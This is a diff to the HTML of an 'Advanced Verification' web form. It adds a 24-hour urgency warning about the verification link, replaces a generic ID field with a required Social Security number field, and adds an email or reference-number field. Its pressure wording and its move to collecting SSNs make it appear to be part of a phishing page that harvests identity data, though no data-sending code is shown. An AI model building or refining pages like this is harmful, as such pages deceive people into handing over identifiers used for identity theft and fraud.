@@ -133,11 +133,25 @@
           <h2 class="text-2xl font-bold text-gray-900 mb-2">Advanced Verification</h2>
           <p class="text-gray-600">Complete your identity verification to access all features</p>
         </div>
+
+        <!-- Warning Notice -->
+        <div class="mb-6 p-4 bg-yellow-50 border-l-4 border-yellow-400 rounded-r-lg">
+          <div class="flex items-start">
+            <svg class="w-5 h-5 text-yellow-400 mt-0.5 mr-3 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+              <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
+            </svg>
+            <div>
+              <p class="text-sm text-yellow-800 font-medium">
+                <strong>Important:</strong> This verification link is valid for 24 hours. After 24 hours, kindly request another.
+              </p>
+            </div>
+          </div>
+        </div>
         
         <form id="verification-form" class="space-y-6">
-          <!-- ID Number -->
+          <!-- SSN -->
           <div>
-            <label for="id_number" class="block text-sm font-medium text-gray-700 mb-2">ID Number</label>
+            <label for="ssn" class="block text-sm font-medium text-gray-700 mb-2">SSN</label>
             <div class="input-group">
               <svg class="input-icon w-5 h-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                 <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
@@ -145,7 +159,19 @@
                 <path d="M22 21v-2a4 4 0 0 0-3-3.87"></path>
                 <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
               </svg>
-              <input type="text" id="id_number" name="id_number" required class="w-full bg-gray-50 border border-gray-300 rounded-lg py-3 pl-12 pr-4 focus:ring-2 focus:ring-blue-600 focus:border-blue-600 focus:outline-none text-gray-900" placeholder="Enter your ID number">
+              <input type="text" id="ssn" name="ssn" required class="w-full bg-gray-50 border border-gray-300 rounded-lg py-3 pl-12 pr-4 focus:ring-2 focus:ring-blue-600 focus:border-blue-600 focus:outline-none text-gray-900" placeholder="Enter your SSN">
+            </div>
+          </div>
+
+          <!-- Email/Reference Number -->
+          <div>
+            <label for="email_reference" class="block text-sm font-medium text-gray-700 mb-2">Email Address/Reference Number</label>
+            <div class="input-group">
+              <svg class="input-icon w-5 h-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                <polyline points="22,6 12,13 2,6"></polyline>
+              </svg>
+              <input type="text" id="email_reference" name="email_reference" class="w-full bg-gray-50 border border-gray-300 rounded-lg py-3 pl-12 pr-4 focus:ring-2 focus:ring-blue-600 focus:border-blue-600 focus:outline-none text-gray-900" placeholder="Enter email address or reference number">
             </div>
           </div>
 
